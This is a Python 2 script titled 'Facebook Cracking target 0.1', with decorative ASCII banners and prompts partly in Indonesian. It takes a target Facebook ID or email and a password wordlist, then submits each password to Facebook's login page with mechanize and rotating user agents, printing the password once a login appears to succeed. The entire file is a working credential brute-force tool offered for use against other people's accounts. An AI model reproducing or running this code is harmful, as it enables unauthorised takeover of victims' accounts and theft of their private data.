#!usr
# -*- coding: UTF-8 -*-
# Mod by: hari noobs
# team: life of programmer


import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def banner():
    os.system('clear')
    print " "
    runntxt(WW+"    ▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░   ✧")
    runntxt(WW+"    ▐▓█░░\x1b[1;92mFB\x1b[1;97m░▀▄░░█▓▌░█▄▄▄█░   ╔════════╗")
    runntxt(WW+"    ▐▓█░\x1b[1;92mCRACKER\x1b[1;97m░█▓▌░█▄▄▄█░   ║        ║")
    runntxt(WW+"    ▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█:███░   ║        ║")
    runntxt(WW+"    ░░░░▄▄███▄▄░░░░░█████░   ║        ║")
    runntxt(WW+"  ╔══════════════════════════╣        ║")
    runntxt(WW+"  ╚══════════════════════════╝        ║")
    time.sleep(1.5)
    print WW+"  ╔═══════════════════════════════════╩═════════╗"
    print WW+"  ║••••••   \x1b[1;92mFacebook Cracking target 0.1  \x1b[1;97m••••••║"
    print WW+"  ╠═════════════════════════════════════════════╣"
    print WW+"  ║            \x1b[1;93m Author: SantriCyber            \x1b[1;97m ║"
    print WW+"  ╠═════════════════════════════════════════════╣"
    print WW+"  ║  \x1b[1;93m Github : https://github.com/SantriCyber   \x1b[1;97m║"
    print WW+"  ║ \x1b[1;93m  Instagram : santri.cyberteam          \x1b[1;97m    ║"
    print WW+"  ╚═════════════════════════════════════════════╝"

banner()

print wd+"  good luck :*"
print GG+"╭────\033[91m[\033[96m Facebook ID\033[95m / \033[96mUser ID target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰───────▷Target : \033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[96mPASSWORD File Wordlist \033[95m( pass.txt ) \033[91;1m]"
password_list = str(raw_input(GG+"╰───────▷list: \033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] crack lagi..??\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"see you..."
                    sys.exit()
                else:
                    print RR+"goodbye..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] apakah anda  hendak merubah wordlist...? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"keluar..."
                sys.exit()

        else:
                print RR+"Jeda...."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" maaf wordlist tidak ada yang cocok..."
        print " "
def hari(hari_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m mencoba kata sandi ==> \033[91m[\033[90;1m"+hari_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = hari_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
			print ("\033[96m                S U C C E S S")
			print "          P A S S W O R D  F I N D "
                  	print RR+"+-------------------------------------------+"
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(hari_password)
        	        print " "
        	        raw_input(WW+"see you again bro....")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"apakah anda akan berhenti..?"
      edit_wordlist()
      sys.exit()    	    
def life():
	global hari_password
	password_nob = open(password_list, "r")
	for hari_password in password_nob:
		password_nob = hari_password.replace("\n","")
		hari(hari_password)		

def runn_noobs():
         global password_list

         lop = GG+"""
                  `.-://////:-.`
              .:+o+:-..````..-:+o+:.
           `:o+-`                `:+o:`
         `/o:`                      `:o/`
        -s/`  .-..`            `..--` `/s-
       /o.   `:.`.-:----------:-.``:-   .o/
      /o`    .:`    `              --    `o/
     -s.     .:`                   --     .s-
     o/     .:`                     --     +o
    .s-     :.                      `:`    -s`
    .s.     :.                      `:`    .s.
    .s-     --                      .:     -s.
     o/     `-.                    `-.     /o
     -s.     `--`                `.-`     .s-
      /o` ----``..--..`    `...--.`      `o/
       /o. `----`  `-.      `-.         .o/
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                  `.-::////::-.` \033[91;1m
                \033[90;1mLife Of Hackerz\033[91;1m
             Powered by:\033[97m s4n7riCyb3r
      """


         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print wd+" [#] Password >> \033[97;1m:", len(nuub),'password'
         print wd+" [#] Prosses Cracking\033[97;1m.........."
         print " "

if __name__=='__main__':
	main()	
